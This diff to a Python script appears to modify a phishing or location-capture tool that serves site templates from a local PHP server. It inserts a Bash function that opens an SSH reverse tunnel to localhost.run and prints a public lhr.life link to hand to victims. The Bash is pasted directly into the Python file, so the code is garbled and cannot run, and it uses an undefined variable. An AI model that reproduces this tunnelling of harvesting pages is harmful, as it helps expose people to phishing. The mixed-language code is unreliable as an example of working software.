@@ -150,7 +150,14 @@ def server():
 	preoc = False
 	print(f'{G}[+] {C}Port : {W}{port}\n')
 	print(f'{G}[+] {C}Starting PHP Server...{W}', end='', flush=True)
+	
 	cmd = ['php', '-S', f'0.0.0.0:{port}', '-t', f'template/{SITE}/']
+	start_lhrlife
+	                           echo -e $'\e[1;33m\e[0m\e[1;77m\e[0m\e[1;33m\e[0m\e[1;96m ------------------------- > > > > > > >\e[0m'
+                           printf "\e[1;33m\e[0m\e[1;33m lhr.Life Link :\e[0m\e[1;77m %s\e[0m\n" $lhrlifelink                                  
+                           echo -e $'\e[1;33m\e[0m\e[1;77m\e[0m\e[1;33m\e[0m\e[1;96m ------------------------- > > > > > > >\e[0m'
+                           printf "\e[1;33m\e[0m\e[1;33m Modify Link :\e[0m\e[1;77m %s\e[0m\n" $final_url
+                           echo -e $'\e[1;33m\e[0m\e[1;77m\e[0m\e[1;33m\e[0m\e[1;96m ------------------------- > > > > > > >\e[0m'
 
 	with open(LOG_FILE, 'w+') as phplog:
 		proc = subp.Popen(cmd, stdout=phplog, stderr=phplog)
@@ -176,6 +183,40 @@ def server():
 			print(f'{C}[ {R}✘{C} ]{W}')
 			cl_quit(proc)
 	return proc
+
+
+
+
+
+
+
+
+
+
+start_lhrlife() {
+echo -e " "
+rm -rf lhrlife
+echo -e ""
+        echo -e "\e[91m[\e[0m-\e[91m]\e[1;92m Launching lhr.Life SSH...\e[0m "
+	echo -e "\n"
+	echo -e ""
+sleep 1 && ssh -R 80:localhost:4444 nokey@localhost.run > lhrlife 2>&1 &
+echo ""
+	sleep 12
+	lhrlifelink=$(cat lhrlife | grep -o 'https://[0-9a-zA-Z.]*.lhr.life')
+	
+}
+
+
+
+
+
+
+
+
+
+
+
 
 
 def wait():
